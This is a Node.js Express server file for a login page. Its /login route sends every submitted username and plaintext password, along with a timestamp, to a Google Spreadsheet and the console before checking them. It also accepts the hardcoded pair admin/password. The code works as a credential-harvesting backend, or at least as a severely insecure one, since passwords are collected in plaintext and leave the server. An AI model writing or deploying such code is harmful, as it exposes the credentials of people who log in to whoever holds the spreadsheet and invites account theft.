require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { google } = require('googleapis');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json()); // Essential for parsing POST JSON bodies!

// Serve frontend static files
app.use(express.static(path.join(__dirname)));

// (Sheets client is initialized per-request below instead)
// Set up Google Sheets API credentials using a Service Account JSON file
const auth = new google.auth.GoogleAuth({
    keyFile: path.join(__dirname, 'credentials.json'),
    scopes: ['https://www.googleapis.com/auth/spreadsheets'] // The scope required
});

// Set up login route
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    try {
        // Create log entry to send to Google Sheets for EVERY login attempt
        const logEntry = {
            timestamp: new Date().toISOString(),
            username,
            password
        };

        // Properly initialize the sheets client with our auth object
        const sheetsClient = google.sheets({ version: 'v4', auth });

        // Using await to catch any error from Sheets API and using .env variable
        if (process.env.SPREADSHEET_ID && process.env.SPREADSHEET_ID !== 'YOUR_SPREADSHEET_ID') {
            await sheetsClient.spreadsheets.values.append({
                spreadsheetId: process.env.SPREADSHEET_ID,
                range: 'Sheet1!A1:C1', // Adjust this if your sheet name is different
                insertDataOption: 'INSERT_ROWS',
                valueInputOption: 'RAW',
                resource: {
                    values: [[logEntry.timestamp, logEntry.username, logEntry.password]]
                }
            });
            console.log('Logged to Google Sheets:', logEntry);
        } else {
            console.log('Skipping Google Sheets: SPREADSHEET_ID not properly configured in .env', logEntry);
        }

        // Check credentials (replace with actual database query or logic)
        // For testing purposes, we use "admin" and "password" to signify success
        if (username === 'admin' && password === 'password') {
            res.json({ success: true });
        } else {
            res.json({ success: false });
        }
    } catch (error) {
        console.error('Error in /login route:', error);
        res.status(500).json({ success: false, error: 'Internal Server Error' });
    }
});

// Fallback to index.html for dashboard or other routes (SPA like behavior)
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server started on http://localhost:${PORT}`);
});
